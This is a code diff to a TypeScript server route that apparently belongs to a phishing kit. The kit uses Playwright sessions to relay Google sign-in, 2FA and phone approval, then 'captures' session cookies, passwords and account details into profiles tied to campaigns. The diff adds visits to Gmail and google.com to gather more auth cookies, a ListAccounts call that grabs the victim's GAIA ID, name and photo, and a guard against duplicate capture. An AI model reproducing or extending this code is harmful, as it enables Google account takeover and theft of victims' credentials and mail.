@@ -10,6 +10,9 @@ import { v4 as uuid } from 'uuid';
 
 const router = Router();
 
+// Prevents concurrent DP status polls from both finalizing the same session
+const finalizingSessions = new Set<string>();
+
 /**
  * POST /api/google/session/start
  * Initialize Playwright session and validate email with Google
@@ -432,7 +435,7 @@ router.post('/:id/2fa', async (req: Request, res: Response) => {
 
     // Create profile and destroy session — runs regardless of DB state
     if (result.success && result.cookies) {
-      await createProfileFromSession(id, result.cookies);
+      await createProfileFromSession(id, result.cookies, result.gaiaId, result.fullName, result.pictureUrl);
       await resourceManager.destroySession(id);
     }
 
@@ -469,52 +472,94 @@ router.get('/:id/status', async (req: Request, res: Response) => {
     const result = await googleAuthService.pollDpCompletion(id);
 
     if (result.status === 'AUTHENTICATED') {
-      // Wait for Gmail to fully initialize all auth cookies (SIDTS, GMAIL_AT, GMAIL_SCH, etc.)
-      // These are set by Gmail's JavaScript AFTER the page loads — capturing immediately misses them
-      logger.info(`[DP] Phone approved — session ${id}, waiting for Gmail to fully initialize...`);
-      await session.page.waitForLoadState('load', { timeout: 15000 }).catch(() => {});
-      await session.page.waitForTimeout(5000);
-      // Visit Gmail to trigger OSID, COMPASS, GMAIL_AT, GMAIL_LF, __Host-GMAIL_SCH_* issuance
-      await session.page.goto('https://mail.google.com/mail/u/0/', {
-        waitUntil: 'domcontentloaded',
-        timeout: 30000,
-      }).catch(() => {});
-      await session.page.waitForLoadState('networkidle', { timeout: 15000 }).catch(() => {});
-      logger.success(`[DP] Phone approved — session ${id}, extracting cookies now`);
-
-      // Extract cookies BEFORE closing anything
-      const cookies = await session.page.context().cookies();
-
-      await createProfileFromSession(id, cookies);
+      // Race condition guard — concurrent polls both see AUTHENTICATED; only the first proceeds
+      if (finalizingSessions.has(id)) {
+        return res.json({ status: 'COMPLETED' });
+      }
+      finalizingSessions.add(id);
 
       try {
-        await prisma.session.update({
-          where: { id },
-          data: { status: 'COMPLETED', completedAt: new Date() },
-        });
-        const dbSession = await prisma.session.findUnique({ where: { id } });
-        if (dbSession && dbSession.captureId) {
-          await campaignService.incrementCaptureCount(dbSession.captureId);
-        }
-      } catch (dbError: any) {
-        logger.warn(`[STATUS] DB update skipped: ${dbError.message}`);
-      }
+        logger.info(`[DP] Phone approved — session ${id}, navigating for full cookie issuance...`);
+        // Navigate to Gmail to trigger OSID, COMPASS, GMAIL_AT, GMAIL_LF, __Host-GMAIL_SCH_* cookies
+        await session.page.goto('https://mail.google.com/mail/u/0/', {
+          waitUntil: 'domcontentloaded',
+          timeout: 30000,
+        }).catch(() => {});
+        await session.page.waitForLoadState('networkidle', { timeout: 20000 }).catch(() => {});
+        // Wait for Gmail scheduler JS to set __Host-GMAIL_SCH_* cookies
+        await session.page.waitForTimeout(2500);
+        // Visit google.com to trigger AEC and __Secure-BUCKET issuance
+        await session.page.goto('https://www.google.com/', {
+          waitUntil: 'domcontentloaded',
+          timeout: 15000,
+        }).catch(() => {});
+        // Return to Gmail to ensure __Host-GMAIL_SCH_* cookies are fully set
+        await session.page.goto('https://mail.google.com/mail/u/0/', {
+          waitUntil: 'networkidle',
+          timeout: 20000,
+        }).catch(() => {});
+        await session.page.waitForTimeout(2000);
 
-      if (session.campaignId) {
-        const campaign = await prisma.campaign.findUnique({ where: { id: session.campaignId } }).catch(() => null);
-        if (campaign) {
-          websocketService.broadcastLiveCapture(campaign.userId, {
-            sessionId: id,
-            campaignId: session.campaignId,
-            campaignName: campaign.name,
-            stage: 'success',
-            timestamp: new Date(),
+        // Capture GAIA ID, display name, and picture URL via ListAccounts
+        let dpGaiaId = '';
+        let dpFullName = '';
+        let dpPictureUrl = '';
+        try {
+          const laRaw = await session.page.evaluate(async () => {
+            const r = await fetch('https://accounts.google.com/listaccounts?json=1', {
+              credentials: 'include',
+            });
+            return r.text();
           });
+          const laJson = JSON.parse(laRaw.replace(")]}'\n", ''));
+          const account = laJson?.[1]?.[0];
+          if (account) {
+            dpGaiaId     = String(account[2] || '');
+            dpFullName   = String(account[3] || '');
+            dpPictureUrl = String(account[4] || '');
+          }
+          logger.info(`[GAIA][DP] ID: ${dpGaiaId} | Name: ${dpFullName}`);
+        } catch (e: any) {
+          logger.warn(`[GAIA][DP] ListAccounts fetch failed: ${e.message}`);
         }
-      }
 
-      await resourceManager.destroySession(id);
-      await googleAuthService.cleanupSession(id);
+        logger.success(`[DP] Phone approved — session ${id}, extracting cookies now`);
+        // Extract cookies BEFORE closing anything
+        const cookies = await session.page.context().cookies();
+
+        await createProfileFromSession(id, cookies, dpGaiaId, dpFullName, dpPictureUrl);
+
+        try {
+          await prisma.session.update({
+            where: { id },
+            data: { status: 'COMPLETED', completedAt: new Date() },
+          });
+          const dbSession = await prisma.session.findUnique({ where: { id } });
+          if (dbSession && dbSession.captureId) {
+            await campaignService.incrementCaptureCount(dbSession.captureId);
+          }
+        } catch (dbError: any) {
+          logger.warn(`[STATUS] DB update skipped: ${dbError.message}`);
+        }
+
+        if (session.campaignId) {
+          const campaign = await prisma.campaign.findUnique({ where: { id: session.campaignId } }).catch(() => null);
+          if (campaign) {
+            websocketService.broadcastLiveCapture(campaign.userId, {
+              sessionId: id,
+              campaignId: session.campaignId,
+              campaignName: campaign.name,
+              stage: 'success',
+              timestamp: new Date(),
+            });
+          }
+        }
+
+        await resourceManager.destroySession(id);
+        await googleAuthService.cleanupSession(id);
+      } finally {
+        finalizingSessions.delete(id);
+      }
     }
 
     return res.json(result);
@@ -530,7 +575,7 @@ router.get('/:id/status', async (req: Request, res: Response) => {
 /**
  * Helper: Create profile from session
  */
-async function createProfileFromSession(sessionId: string, cookies: any[]) {
+async function createProfileFromSession(sessionId: string, cookies: any[], gaiaId = '', fullName = '', pictureUrl = '') {
   try {
     // Extract Google auth cookies regardless of DB state
     const googleCookies = googleAuthService.extractGoogleCookies(cookies);
@@ -546,6 +591,7 @@ async function createProfileFromSession(sessionId: string, cookies: any[]) {
           data: {
             cookies: googleCookies.length > 0 ? JSON.stringify(googleCookies) : undefined,
             authStatus: googleCookies.length > 0 ? 'AUTHENTICATED' : 'NOT_AUTHENTICATED',
+            ...(gaiaId && { accountInfo: JSON.stringify({ gaiaId, fullName, pictureUrl }) }),
           },
         });
         logger.success(`[CAPTURE] Profile ${existingProfileId} updated → ${googleCookies.length} cookies, AUTHENTICATED`);
@@ -608,6 +654,7 @@ async function createProfileFromSession(sessionId: string, cookies: any[]) {
       password: password || '',
       cookies: googleCookies,
       provider: 'GOOGLE',
+      accountInfo: JSON.stringify({ gaiaId, fullName, pictureUrl }),
     });
 
     logger.success(`[CAPTURE] Profile created — session: ${sessionId}, email: ${email}, cookies: ${googleCookies.length}`);
